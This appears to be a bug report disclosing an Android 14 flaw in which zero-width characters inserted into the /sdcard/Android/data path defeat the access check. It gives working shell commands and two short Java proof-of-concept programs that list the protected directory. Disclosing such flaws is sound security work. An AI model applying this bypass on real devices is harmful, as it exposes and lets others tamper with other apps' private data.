# Android OS has a logical flaw in determining the Android/data access path

BUG_Author:
hujiayucc

Affected version:
Android 14

Vendor:
https://www.android.com/

Description:

Android操作系统对Android/data访问路径判断存在逻辑缺陷。

系统对Android/data路径字符串过滤没做好正确处理，黑客可以利用这个漏洞任意读取、写入、删除Android/data目录下的所以文件夹和文件。

状态：严重

漏洞环境及工具
- Android OS 14
- Termux 任意版本


复现过程
```shell
ls /sdcard/Android/data
```

执行以上代码，可以看到没有访问权限

```shell
ls /sdcard/Android$'\u200d'/data
```
但是在路径中加入\u200d，可以绕过路径判断

[![](https://oss.hujiayucc.cn/blog/OSS8uli20240603135758.png?x-oss-process=image/resize,m_fixed,h_370,w_600)](https://oss.hujiayucc.cn/blog/OSS8uli20240603135758.png)

经测试，可以对Android/data目录下的所有文件进行任意操作
[![](https://oss.hujiayucc.cn/blog/OSSLXxP20240603140135.png?x-oss-process=image/resize,m_fixed,h_370,w_600)](https://oss.hujiayucc.cn/blog/OSSLXxP20240603140135.png)

Poc1:
```java
File dir = new File("/sdcard/Android\u200d/data");
File[] files = dir.listFiles();
for (File file : files) {
    System.out.println(file);
}
```
Poc2:
```java
File dir = new File("/sdcard/\u200bAndroid/data");
File[] files = dir.listFiles();
for (File file : files) {
    System.out.println(file);
}
```

附加说明

除了 **/sdcard/Android$'\u200d'/data** 以外，还可以通过 **/sdcard/$'\u200b'Android/data** 进行越权操作

![](https://oss.hujiayucc.cn/blog/OSS9QMU20240603141624.png)

[![](https://oss.hujiayucc.cn/blog/OSSKMQe20240603141405.png?x-oss-process=image/resize,m_fixed,h_370,w_600)](https://oss.hujiayucc.cn/blog/OSSKMQe20240603141405.png)

演示视频：[点击查看](https://oss.hujiayucc.cn/videos/Screenrecorder-2024-05-25-11-36-10-451.mp4 "点击查看")
通过以上测试，可以制作一个客户端实现远程访问和修改
